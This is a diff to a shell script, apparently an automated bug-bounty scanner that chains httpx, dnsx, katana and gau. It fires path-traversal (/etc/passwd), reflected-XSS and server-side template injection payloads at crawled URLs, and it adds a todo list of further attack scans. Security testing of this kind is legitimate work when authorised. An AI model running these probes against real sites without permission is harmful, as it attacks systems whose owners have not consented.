@@ -61,12 +61,6 @@ cat $webservers_path | httpx -timeout 30 -vhost -o $vhost_path;
 # get ip by host
 cat $final_list | dnsx -silent -a -resp-only | sort -u | tee $ips_path;
 
-# perform a naabu all scan
-naabu -list $ips_path -Pn -exclude-cdn -p - -o $ips_ports_path;
-
-# perform http probing on ips ports
-cat $ips_ports_path | httpx -timeout 30 -sc -title -td -location -o $ips_webservers;
-
 if [ $scan = scan ]; then
     # performing path traversal scans
     cat $webservers_path | httpx -timeout 30 -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $scan_traversal_1;
@@ -79,6 +73,16 @@ if [ $scan = scan ]; then
     cat $katana_path $gau_path | sort -u | grep "?" | qsreplace '"><img/src=x onerror=confirm(1)>' | httpx -timeout 30 -mc 200 -mr '<img/src' -o $scan_reflected_xss;
 
     # performing open redirect scan on get params
-    cat $katana_path $gau_path | sort -u | grep "?" | qsreplace 'https://example.com' | httpx -timeout 30 -mc 301,302,303,308 -mr 'example.com' -o $scan_get_param_openredir;
+    # OUT OF SERVICE TILL REWRITTEN CORRECTLY ==> 
+    #cat $katana_path $gau_path | sort -u | grep "?" | qsreplace 'https://example.com' | httpx -timeout 30 -mc 301,302,303,308 -mr 'example.com' -o $scan_get_param_openredir;
+    
     cat $katana_path $gau_path | sort -u | grep "?" | qsreplace '<%= 5252 *  111%>@(5252*111)${{5252*111}}{{5252*111}}' | httpx -timeout 30 -mc 200 -mr '582972' -o $scan_ssti;
 fi
+
+#todo:
+    # add param based ssrf scanning
+    # add reverse proxy ssrf scanning
+    # maybe simple unix fs param based traversal scanning
+    # figure a way for crlf scanning
+    # add bxss scanning via headers ( xff and UA )
+    # nuclei cves and exposed panels scan
